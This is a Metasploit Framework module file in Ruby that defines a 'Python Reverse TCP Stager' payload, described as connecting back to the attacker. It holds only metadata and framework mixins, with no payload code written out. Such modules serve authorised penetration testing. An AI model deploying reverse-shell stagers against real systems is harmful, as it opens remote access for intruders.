##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 501

  include Msf::Payload::Stager
  include Msf::Payload::Python::ReverseTcp

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Python Reverse TCP Stager',
      'Description' => 'Connect back to the attacker',
      'Author'      => 'Spencer McIntyre',
      'License'     => MSF_LICENSE,
      'Platform'    => 'python',
      'Arch'        => ARCH_PYTHON,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Stager'      => {'Payload' => ""}
    ))
  end
end
